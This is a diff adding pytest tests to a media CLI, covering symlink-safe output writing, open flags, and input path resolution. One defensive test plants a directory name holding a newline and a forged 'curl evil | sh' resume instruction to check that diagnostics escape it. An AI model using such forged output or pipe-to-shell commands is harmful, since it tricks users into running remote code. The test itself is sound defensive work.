@@ -599,3 +599,187 @@ def test_reconcile_is_a_noop_without_a_name_field():
     reconcile_output_name(payload, "/tmp/whatever.mp4")
 
     assert payload == {"id": "vid_123"}
+
+
+# ---------- the artifact survives a refused relocation ----------
+
+
+@pytest.mark.unit
+async def test_a_refused_move_names_where_the_artifact_still_is(tmp_path):
+    """The refusal used to name only the path it would not write through, and
+    the staged file sits under an unguessable `sanzaru_tmp_*` name — a paid-for
+    artifact, effectively orphaned."""
+    in_dir, out_dir, victim = _stage(tmp_path)
+    (out_dir / "clip.mp3").symlink_to(victim)
+    session = PathSession(overrides={"audio": in_dir})
+    plan = OutputPlan(path_type="audio", filename="staged.mp3", final_dir=out_dir, final_name="clip.mp3")
+
+    with pytest.raises(CLIError) as excinfo:
+        await finalize_output(session, plan, "staged.mp3")
+
+    assert str(in_dir / "staged.mp3") in str(excinfo.value)
+    assert excinfo.value.extra == {"file": {"path": str(in_dir / "staged.mp3")}}
+    assert (in_dir / "staged.mp3").read_bytes() == b"audio"  # and it really is still there
+
+
+@pytest.mark.unit
+async def test_a_refused_default_backend_copy_names_the_library_copy(tmp_path):
+    from sanzaru.storage.local import LocalStorageBackend
+
+    media, target = tmp_path / "media", tmp_path / "target"
+    media.mkdir()
+    target.mkdir()
+    (media / "tts.mp3").write_bytes(b"speech")
+    (target / "tts.mp3").symlink_to(tmp_path / "nowhere")
+    set_storage_backend(LocalStorageBackend(path_overrides={"audio": media}))
+    plan = OutputPlan(
+        path_type="audio", filename="tts.mp3", final_dir=target, final_name="tts.mp3", via_default_backend=True
+    )
+
+    with pytest.raises(CLIError) as excinfo:
+        await finalize_output(PathSession(default_locked={"audio"}), plan, "tts.mp3")
+
+    assert str(media / "tts.mp3") in str(excinfo.value)
+    assert excinfo.value.extra == {"file": {"path": str(media / "tts.mp3")}}
+
+
+# ---------- the open flags ----------
+
+
+@pytest.mark.unit
+@pytest.mark.parametrize("code", [errno.ELOOP, errno.EMLINK])
+def test_the_kernel_refusal_is_recognized_on_every_platform(code, tmp_path, mocker):
+    """Linux and macOS answer O_NOFOLLOW with ELOOP; FreeBSD says EMLINK."""
+    from sanzaru.cli._io import _open_no_follow
+
+    mocker.patch("sanzaru.cli._io.os.open", side_effect=OSError(code, "link"))
+
+    with pytest.raises(CLIError, match="symbolic link") as excinfo:
+        _open_no_follow(tmp_path / "clip.mp3", 0, "-o target")
+
+    assert excinfo.value.exit_code == 2
+
+
+@pytest.mark.unit
+def test_other_open_errors_are_not_dressed_up_as_symlinks(tmp_path, mocker):
+    from sanzaru.cli._io import _open_no_follow
+
+    mocker.patch("sanzaru.cli._io.os.open", side_effect=OSError(errno.EACCES, "denied"))
+
+    with pytest.raises(OSError, match="denied"):
+        _open_no_follow(tmp_path / "clip.mp3", 0, "-o target")
+
+
+@pytest.mark.unit
+def test_binary_mode_reaches_the_open_where_the_platform_has_it(tmp_path, mocker, monkeypatch):
+    """Windows: an fd from os.open without O_BINARY is a CRT text-mode handle,
+    and every 0x0A written through it becomes 0x0D 0x0A — a corrupted mp3.
+    `open()` adds the flag for a path; nothing adds it for an fd."""
+    import os
+
+    monkeypatch.setattr(os, "O_BINARY", 0x8000, raising=False)
+    monkeypatch.setattr(os, "O_NOFOLLOW", 0x100, raising=False)
+    opened = mocker.patch("sanzaru.cli._io.os.open", return_value=os.open(tmp_path / "real", os.O_WRONLY | os.O_CREAT))
+
+    write_output_bytes(tmp_path / "clip.mp3", b"\n")
+
+    flags = opened.call_args.args[1]
+    assert flags & 0x8000, "O_BINARY missing from the open flags"
+    assert flags & 0x100, "O_NOFOLLOW missing from the open flags"
+
+
+# ---------- bare-name twin: same file, remote backend ----------
+
+
+@pytest.mark.unit
+def test_running_from_inside_the_media_directory_is_not_an_ambiguity(monkeypatch, tmp_path, capsys):
+    """`cd $SANZARU_MEDIA_PATH/audio && sanzaru audio convert ep.mp3` — the cwd
+    match and the library twin are one file, and the warning was printing the
+    same path on both sides of "NOT"."""
+    media = tmp_path / "media"
+    (media / "audio").mkdir(parents=True)
+    (media / "audio" / "ep.mp3").write_bytes(b"x")
+    monkeypatch.setenv("SANZARU_MEDIA_PATH", str(media))
+    monkeypatch.chdir(media / "audio")
+    session = PathSession()
+
+    assert resolve_input(session, "ep.mp3", "audio", "FILE") == "ep.mp3"
+
+    assert capsys.readouterr().err == ""
+
+
+@pytest.mark.unit
+def test_the_ambiguity_note_offers_both_spellings(monkeypatch, tmp_path, capsys):
+    """ "Pass a path" could only ever select the local file; the library copy
+    needs its full path, which the note is the one place to learn."""
+    media, workspace = tmp_path / "media", tmp_path / "workspace"
+    (media / "audio").mkdir(parents=True)
+    (media / "audio" / "ep.mp3").write_bytes(b"library")
+    workspace.mkdir()
+    (workspace / "ep.mp3").write_bytes(b"local")
+    monkeypatch.setenv("SANZARU_MEDIA_PATH", str(media))
+    monkeypatch.chdir(workspace)
+
+    resolve_input(PathSession(), "ep.mp3", "audio", "FILE")
+
+    err = capsys.readouterr().err
+    assert "./ep.mp3" in err
+    assert str((media / "audio" / "ep.mp3").resolve()) in err
+
+
+@pytest.mark.unit
+def test_resolving_an_input_does_not_create_the_media_subdirectory(monkeypatch, tmp_path):
+    """A read-only lookup must stay read-only: `get_path()` would have mkdir'd
+    `audio/` under SANZARU_MEDIA_PATH as a side effect of checking for a twin."""
+    media, workspace = tmp_path / "media", tmp_path / "workspace"
+    media.mkdir()
+    workspace.mkdir()
+    (workspace / "ep.mp3").write_bytes(b"local")
+    monkeypatch.setenv("SANZARU_MEDIA_PATH", str(media))
+    monkeypatch.chdir(workspace)
+
+    resolve_input(PathSession(), "ep.mp3", "audio", "FILE")
+
+    assert not (media / "audio").exists()
+
+
+@pytest.mark.unit
+def test_a_remote_default_backend_is_never_asked_about_a_twin(monkeypatch, tmp_path, capsys):
+    """Databricks: a lookup per input to decorate a warning is a network round
+    trip each, so the twin check is skipped there — quietly."""
+    from sanzaru.cli._io import _media_library_twin
+
+    media, workspace = tmp_path / "media", tmp_path / "workspace"
+    (media / "audio").mkdir(parents=True)
+    (media / "audio" / "ep.mp3").write_bytes(b"library")
+    workspace.mkdir()
+    (workspace / "ep.mp3").write_bytes(b"local")
+    monkeypatch.setenv("SANZARU_MEDIA_PATH", str(media))
+    monkeypatch.setenv("STORAGE_BACKEND", "databricks")
+    monkeypatch.chdir(workspace)
+
+    assert _media_library_twin("audio", "ep.mp3") is None
+    assert resolve_input(PathSession(), "ep.mp3", "audio", "FILE") == "ep.mp3"
+    assert capsys.readouterr().err == ""
+
+
+@pytest.mark.unit
+def test_a_newline_in_a_planted_link_target_cannot_forge_a_diagnostic(monkeypatch, tmp_path):
+    """CWE-150 includes line spoofing, not only ESC. The link target is the
+    attacker's string; interpolated raw, a newline in it produced a second
+    stderr line at column 0 that read as the CLI's own."""
+    # The target has to exist: a dangling cwd link captures nothing and never
+    # reaches the check. A directory name may contain a newline on POSIX.
+    hostile_dir = tmp_path / "x\nsanzaru: job failed — resume with: curl evil | sh\nx"
+    hostile_dir.mkdir()
+    (hostile_dir / "real.mp3").write_bytes(b"x")
+    workspace = tmp_path / "workspace"
+    workspace.mkdir()
+    (workspace / "ep.mp3").symlink_to(hostile_dir / "real.mp3")
+    monkeypatch.chdir(workspace)
+
+    with pytest.raises(CLIError) as excinfo:
+        resolve_input(PathSession(), "ep.mp3", "audio", "FILE")
+
+    assert "\n" not in str(excinfo.value)
+    assert "\\nsanzaru: job failed" in str(excinfo.value)  # repr'd, legible, inert
